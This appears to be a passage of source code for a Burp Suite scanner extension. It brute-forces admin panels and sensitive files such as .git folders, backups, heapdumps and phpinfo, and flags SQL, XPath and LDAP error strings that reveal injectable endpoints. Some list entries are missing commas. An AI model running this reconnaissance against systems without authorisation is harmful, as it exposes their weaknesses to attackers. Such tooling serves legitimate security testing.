#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib2

from burp import IBurpExtender
from burp import IScannerCheck
from burp import ITab
from burp import IHttpListener
from burp import IMessageEditorController
from java.awt import Component;
from java.io import PrintWriter;
from java.util import ArrayList;
from java.util import List;
from javax.swing import JScrollPane;
from javax.swing import JSplitPane;
from javax.swing import JTabbedPane;
from javax.swing import JTable;
from javax.swing import SwingUtilities;
from javax.swing.table import AbstractTableModel;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
from threading import Lock
import re,urllib
import urlparse
from urllib import urlencode
from time import sleep
import socket
from burp import IScanIssue
import httplib
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.ListIterator;
from javax.swing import JMenuItem
from javax.swing import JPopupMenu
from burp import IContextMenuFactory
from burp import IContextMenuInvocation
from java.awt.event import ActionListener
from javax.swing import RowFilter
from java.awt.event import ItemListener
from javax.swing.table import TableRowSorter
from java.net import URL
from thread import start_new_thread
from urlparse import parse_qs
from urllib2 import urlopen
import requests
import time
from requests_toolbelt.utils import dump
import os
import sys
from burp import ITextEditor
import string

reload(sys)
sys.setdefaultencoding("utf-8")
analistem = {}
taranan={}

session = requests.Session()
import urllib3
import random


from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel,IScannerCheck,IContextMenuFactory):



    def	registerExtenderCallbacks(self, callbacks):

	global dout, derr
	global postlarisuz

	postlarisuz={}

	# keep a reference to our callbacks object
	self._callbacks = callbacks
	self._helpers = callbacks.getHelpers()
	callbacks.setExtensionName("0x94TR Scanner")

	dout = PrintWriter(callbacks.getStdout(), True)
	derr = PrintWriter(callbacks.getStderr(), True)

	dout.println("0x94TR Scanner plugin loaded | twitter.com/0x94")

	self._log = ArrayList()
	self._lock = Lock()

	self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)

	logTable = Table(self)
	scrollPane = JScrollPane(logTable)

	self._splitpane.setLeftComponent(scrollPane)

	tabs = JTabbedPane()

	self._requestViewer = callbacks.createMessageEditor(self, False)
	self._responseViewer = callbacks.createMessageEditor(self, False)
	tabs.addTab("Payload", self._requestViewer.getComponent())
	tabs.addTab("Response", self._responseViewer.getComponent())

	self._splitpane.setRightComponent(tabs)

	callbacks.customizeUiComponent(self._splitpane)
	callbacks.customizeUiComponent(logTable)
	callbacks.customizeUiComponent(scrollPane)
	callbacks.customizeUiComponent(tabs)

	callbacks.addSuiteTab(self)

	callbacks.registerHttpListener(self)
	callbacks.addSuiteTab(self)

	return

    #
    # implement ITab
    #

    def getTabCaption(self):
	return "0x94 TR"

    def getUiComponent(self):
	return self._splitpane

    def createMenuItems(self, invocation):
	menu = []
	responses = invocation.getSelectedMessages()
	if len(responses) == 1:
	    menu.append(JMenuItem("xxx", None, actionPerformed=lambda x, inv=invocation: self.sqlmapShell(inv)))
	    return menu
	return None


    def brute_file(self,url):
	protocol = urlparse.urlparse(url).scheme + "://"
	dizin = url
	if url.count("/") >= 3:
	    if url.count("/") == 3:
		dizin = protocol + url.rsplit("/")[2] + "/"
	    elif url.count("/") == 4:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/"
	    elif url.count("/") == 5:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/" + url.rsplit("/")[4] + "/"
	    elif url.count("/") == 6:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/" + url.rsplit("/")[4] + "/" + \
				    url.rsplit("/")[5] + "/"

	bflist =[
		    "/admin",
		"/admin.asp",
	    "/admin.aspx",
	    "/admin.cfm",
	    "/admin.cgi",
	    "/admin.do",
	    "/admin.htm",
	    "/admin.py",
	    "/sadmin",
	    "/cmsadmin",
	    "/admin.db",
	    "/admin.ctp",
	    "/admin.ini",
	    "/admin.tpl",
	    "/admin.xml",
	    "/admin.html",
	    "/admin.jsp",
	    "/admin.php",
	    "/admin.php3",
	    "/admin2",
	    "/admin_",
	    "/admin_login",
	    "/admin_logon",
	    "/administracion",
	    "/administrador",
	    "/administrateur",
	    "/administration",
	    "/administrator",
	    "/administrator",
	    "/adminlogon",
	    "/authadmin",
	    "/backend",
	    "/console",
	    "/fpadmin",
	    "/iisadmin",
	    "/manage",
	    "/manager",
	    "/phpmyadmin",
	    "/portal",
	    "/siteadmin",
	    "/staff",
	    "/user",
	    "/users",
	    "/usuario",
	    "/usuarios",
	    "/webadmin",
	    "/wp-admin",
	    "/~admin",
	    "/_admin",
	    "/admin2.php",
	    "/admin.html",
	    "/admins.php",
	    "/admin.php3",
	    "/admin.aspx",
	    "/_admin.php",
	    "/admin1.php",
	    "/phpinfo.php",
	    "/PhpInfo.php",
	    "/PHPinfo.php",
	    "/PHPINFO.php",
	    "/phpInfo.php",
	    "/info.php",
	    "/Info.php",
	    "/INFO.php",
	    "/test.php",
	    "/install.php",
	    "/INSTALL.php",
	    "/admin.php",
	    "/phpversion.php",
	    "/phpVersion.php",
	    "/test1.php",
	    "/test.php",
	    "/test2.php",
	    "/phpinfo1.php",
	    "/phpInfo1.php",
	    "/info1.php",
	    "/PHPversion.php",
	    "/x.php",
	    "/xx.php",
	    "/xxx.php",
	    "/backup_2019.zip",
	    "/backup_2019.tar.gz",
	    "/backup.gz",
	    "/backup.zip",
	    "/api/proxy",
	    "/swagger-ui",
	    "/demo",
	    "/metrics",
	    "/java",
	    "/dasbhoard/",
	    "/solr",
	    "/composer.json",
	    "manifest.json",
	    "/temp",
	    "/data,"
	    "/heapdump",
	    "/codeception.yml",
	    "/api/",
	    "/download",
	    "/readfile",
	    "/test",
	    "/testing",
	    "/proxy",
	    "/debug",
	    "/backup",
	    "/config",
	    "/upload",
	    "/.git",
	    "/files",
	    "/old",
	    "/application.wadl",
	    "/graph",
	    "/.svn",
	    "/dev",
	    "/beans",
	    "/env",
	    "/secret",
	    "/.secret",
	    "index.php.swp",
	    "/charts",
	    "/script",
	    "/jenkins/script",
	    "/admen",
	    "/charts/",
	    "/swagger-ui",
	    "/demo"
	    "/out",
	    "/version",
	    "/_admin",
	     "/server-status"
	    "/CFIDE/",
	    "/version.txt",
	    "/FCKeditor/",
	    "/flashservices/",
	    "/CFFileServlet/",
	    "/manager/",
	    "/samples",
	    "/error_log",
	    "/cfusion/",
	    "/dana-na/",
	    "/autodiscover/autodiscover.xml",
	    "/cf_scripts/",
	    "/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx",
	    "/Microsoft-Server-ActiveSync/"]

	source404=self.page404(dizin)

	for xx in bflist:
	    try:
		urlac = session.get(dizin + xx)
		response = urlac.text
		data = dump.dump_all(urlac)
		rawdata = data.decode('utf-8')
		if urlac.status_code == 200:
		    if len(source404)!=len(response):
			self.ekle("GET", dizin + xx, xx + " Brute File", dizin + xx, rawdata)
	    except:
		mesaj = "error"

    def tumdizinlerde(self,url):
	protocol = urlparse.urlparse(url).scheme + "://"
	dizin = url
	if url.count("/") >= 3:
	    if url.count("/") == 3:
		dizin = protocol + url.rsplit("/")[2] + "/"
	    elif url.count("/") == 4:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/"
	    elif url.count("/") == 5:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/" + url.rsplit("/")[4] + "/"
	    elif url.count("/") == 6:
		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/" + url.rsplit("/")[4] + "/" + \
				    url.rsplit("/")[5] + "/"

	listem = {"/phpinfo.php": "_SERVER",
		          "/database_connect.php": "Access denied for",
		  "/db.php": "Access denied for",
		  "/connect.php": "Access denied for",
		     "/WS_FTP.LOG": "<--",
		    "/index.bak": "<?PHP",
		    "/index.bak": "<?",
		     "/.idea/workspace.xml": "project version",
		    ".htaccess": "RewriteEngine",
		    ".travis.yml": "language",
		      "/admin": "password",
		    "/phpmyadmin":"phpMyAdmin</bdo>"}

	for xx, yy in listem.iteritems():
	    try:
		urlac = session.get(dizin + xx)
		response = urlac.text
		data = dump.dump_all(urlac)
		rawdata = data.decode('utf-8')
		if urlac.status_code == 200:
		    if yy in response:
			self.ekle("GET", dizin+xx, xx + " File", dizin+xx, rawdata)
	    except:
		mesaj = "error"



    def hatakontrol(self,method,url,response,urlnormal):
    
    
	if re.search("DEBUG = True in your Django settings file",response,re.DOTALL):
	    mesaj= "[#] %s Django Config" % urlnormal
	    self.ekle(method,url,"Django Config error", "",response)
    
	if re.search("SQLServer JDBC Driver", response, re.DOTALL):
	    mesaj = "[#] %s MSSQL Error" % urlnormal
	    self.ekle(method, url, "MSSQL error", "", response)
    
	if re.search("SybSQLException", response, re.DOTALL):
	    mesaj = "[#] %s SybSQL Error" % urlnormal
	    self.ekle(method, url, "SybSQL error", "", response)
    
	if re.search("valid PostgreSQL result", response, re.DOTALL):
	    mesaj = "[#] %s valid PostgreSQL result" % urlnormal
	    self.ekle(method, url, "PostgreSQL error", "", response)
    
    
	if re.search("vSQLite/JDBCDriver", response, re.DOTALL):
	    mesaj = "[#] %s SQLite/JDBCDriver" % urlnormal
	    self.ekle(method, url, "SQLite error", "", response)
    
	if re.search("PSQLException", response, re.DOTALL):
	    mesaj = "[#] %s PSQLException" % urlnormal
	    self.ekle(method, url, "PostgreSQL error", "", response)
    
	if re.search("Informix ODBC Driver", response, re.DOTALL):
	    mesaj = "[#] %s Informix Error" % urlnormal
	    self.ekle(method, url, "Informix error", "", response)
    
	if re.search("System.Xml.XPath.XPathException",response,re.DOTALL):
	    mesaj = "[#] %s Xpath Error" % urlnormal
	    self.ekle(method, url, "Xpath error", "", response)
    
	if re.search("xmlXPathEval: evaluation failed",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("SimpleXMLElement::xpath()",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("XPathException",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("MS.Internal.Xml.",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("XPathException",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Unknown error in XPath",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("org.apache.xpath.XPath",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("A closing bracket expected in",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("An operand in Union Expression does not produce a node-set",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Cannot convert expression to a number",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Document Axis does not allow any context Location Steps",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Empty Path Expression",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Empty Relative Location Path",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Empty Union Expression",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Expected '\)' in",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Expected node test or name specification after axis operator",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Incompatible XPath key",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Incorrect Variable Binding",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("libxml2 library function failed",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("XPathException",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("xmlsec library function",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("error '80004005'",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("A document must contain exactly one root element.",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Expression must evaluate to a node-set.",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("Expected token '\]'",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("<p>msxml4.dll</font>",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("<p>msxml3.dll</font>",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("4005 Notes error: Query is not understandable",response,re.DOTALL):
	    mesaj= "[#] %s Xpath Error" % urlnormal
	    self.ekle(method,url,"Xpath error", "",response)
    
	if re.search("DB2 SQL error:",response,re.DOTALL):
	    mesaj= "[#] %s DB2 ERROR " % urlnormal
	    self.ekle(method,url,"Db2 error", "",response)
    
	if re.search("supplied argument is not a valid ldap",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("javax.naming.NameNotFoundException",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("LDAPException",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Search: Bad search filter",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Protocol error occurred",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Size limit has exceeded",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("An inappropriate matching occurred",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("A constraint violation occurred",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The syntax is invalid",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Object does not exist",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The alias is invalid",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The distinguished name has an invalid syntax",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The server does not handle directory requests",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("There was a naming violation",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("There was an object class violation",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Results returned are too large",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Unknown error occurred",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("Local error occurred",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The search filter is incorrect",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The search filter is invalid",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("The search filter cannot be recognized",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
    
	if re.search("Invalid DN syntax",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
    
	if re.search("No Such Object",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
	if re.search("IPWorksASP.LDAP",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
    
	if re.search("Module Products.LDAPMultiPlugins",response,re.DOTALL):
	    mesaj= "[#] %s LDAP ERROR " % urlnormal
	    self.ekle(method,url,"LDAP error", "",response)
    
    
	if re.search("eval()'d code</b> on line <b>",response,re.DOTALL):
	    mesaj= "[#] %s PHP eval hatasi " % urlnormal
	    self.ekle(method,url,"Php Eval error", "",response)
    
	if re.search("Cannot execute a blank command in",response,re.DOTALL):
	    mesaj= "[#] %s exec hatasi " % urlnormal
	    self.ekle(method,url,"Exec error", "",response)
    
	if re.search("Fatal error</b>:  preg_replace",response,re.DOTALL):
	    mesaj= "[#] %s Ppreg_replace hatasi " % urlnormal
	    self.ekle(method,url,"preg_replace error", "",response)
    
    
	if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
	    mesaj= "[#] %s MS-SQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Syntax error in string in query",response,re.DOTALL):
	    mesaj= "[#] %s SQL error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Conversion failed when converting the nvarchar",response,re.DOTALL):
	    mesaj= "[#] %s MSSQL error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
	    mesaj= "[#] %s MS-Access error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
	    mesaj= "[#] %s MS-SQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
	    mesaj= "[#] %s MS-Access error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Microsoft JET Database Engine",response,re.DOTALL):
	    mesaj= "[#] %s MS Jet database engine error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("ADODB.Command.*error",response,re.DOTALL):
	    mesaj= "[#] %s ADODB Error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Microsoft VBScript runtime",response,re.DOTALL):
	    mesaj= "[#] %s VBScript runtime error" % urlnormal
	    self.ekle(method,url,"VBSCRIPT  error", "",response)
    
	if re.search("Type mismatch",response,re.DOTALL):
	    mesaj= "[#] %s VBScript / ASP error" % urlnormal
	    self.ekle(method,url,"VBSCRIPT error", "",response)
    
	if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
	    mesaj= "[#] %s ASP .NET OLEDB Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
	    mesaj= "[#] %s Apache Tomcat JDBC error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("mysql_fetch_array() expects parameter",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("XML parser error",response,re.DOTALL):
	    mesaj= "[#] %s XML Error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	    mesaj= "[#] %s Oracle DB Server error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("DorisDuke error",response,re.DOTALL):
	    mesaj= "[#] %s DorisDuke error\n" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
	    mesaj= "[#] %s Java Servlet error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
	    mesaj= "[#] %s Apache Tomcat error" % urlnormal
	    self.ekle(method,url,"Tomcat error", "",response)
    
	if re.search("Warning.*failed to open stream",response,re.DOTALL):
	    mesaj= "[#] %s PHP error" % urlnormal
	    self.ekle(method,url,"PHP error", "",response)
    
	if re.search("Fatal Error.*on line",response,re.DOTALL):
	    mesaj= "[#] %s PHP error" % urlnormal
	    self.ekle(method,url,"PHP error", "",response)
    
	if re.search("Warning: mysql_num_rows():",response,re.DOTALL):
	    mesaj= "[#] %s MYSQL ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Unclosed quotation mark",response,re.DOTALL):
	    mesaj= "[#] %s MSSQL ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("java.sql.SQLException",response,re.DOTALL):
	    mesaj= "[#] %s Java SQL ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("SqlClient.SqlException",response,re.DOTALL):
	    mesaj= "[#] %s SqlClient ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Incorrect syntax near",response,re.DOTALL):
	    mesaj= "[#] %s SQL ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("PostgreSQL query failed",response,re.DOTALL):
	    mesaj= "[#] %s PostgreSQL ERROR " % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("500 - Internal server error",response,re.DOTALL):
	    mesaj= "[#] %s Internal server error " % urlnormal
	    self.ekle(method,url,"Server error", "",response)
    
	if re.search("Unclosed quotation mark",response,re.DOTALL):
	    mesaj= "[#] %s MSSQL ERROR" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("java.sql.SQLException",response,re.DOTALL):
	    mesaj= "[#] %s Java Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("valid PostgreSQL result",response,re.DOTALL):
	    mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Oracle.*Driver",response,re.DOTALL):
	    mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Procedure '[^']+' requires parameter '[^']+'",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Sybase message:",response,re.DOTALL):
	    mesaj= "[#] %s Sybase Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Column count doesn't match:",response,re.DOTALL):
	    mesaj= "[#] %s MySQL Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Dynamic Page Generation Error:",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("<b>Warning<b>: ibase_",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Dynamic SQL Error",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("\[Macromedia\]\[SQLServer JDBC Driver\]",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("An illegal character has been found in the statement",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("A Parser Error \(syntax error\)",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("where clause",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("PostgreSQL.*ERROR",response,re.DOTALL):
	    mesaj= "[#] %s PostgreSQL Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("CLI Driver.*DB2",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Exception.*Informix",response,re.DOTALL):
	    mesaj= "[#] %s Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("SQLite/JDBCDriver",response,re.DOTALL):
	    mesaj= "[#] %s SQLite Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("SQLite\.Exception",response,re.DOTALL):
	    mesaj= "[#] %s SQLite Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("(PLS|ORA)-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
	    mesaj= "[#] %s Oracle Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("Warning: mysql_connect()",response,re.DOTALL):
	    mesaj= "[#] %s Mysql Connect Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("mysql_connect(): Access denied",response,re.DOTALL):
	    mesaj= "[#] %s Mysql Connect Exception" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
    
	if re.search("fpassthru() expects ",response,re.DOTALL):
	    mesaj= "[#] %s PHP fpassthru Exception" % urlnormal
	    self.ekle(method,url,"PHP fpassthru error", "",response)
    
    
	if re.search("Query timeout expired ",response,re.DOTALL):
	    mesaj= "[#] %s MSSQL Time Based Error" % urlnormal
	    self.ekle(method,url,"SQL error", "",response)
	    
	    
    def normalac(self,url):


	ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
	socket=["new WebSocket("]

	try:

	    urlac = session.get(url)
	    response = urlac.text
	    data = dump.dump_all(urlac)
	    rawdata = data.decode('utf-8')
	    for ajx in ajaxtespit:
		if ajx in response:
		    self.ekle("GET",url,"Ajax Code", ajx,rawdata)

	    for sck in socket:
		if sck in response:
		    self.ekle("GET",url,"WebSocket Code", sck,rawdata)

	    if "<?xml" not in response and "%PDF" not in response:
		if "<?php" in response and "?>" in response:
		    self.ekle("GET",url,"PHP Code","php tag <?php ?>",rawdata)


		# elif "<%" in response and "%>" in response:
		#    return True,url+" ASP Code",response


	except:
	    b="daaf"



   
	    
    def indexoful(self,url):


	try:
	    protocol=urlparse.urlparse(url).scheme+"://"
	    if url.count("/")>=4:

		if url.count("/")==4:
		    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
		elif url.count("/")==5:
		    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
		elif url.count("/")==6:
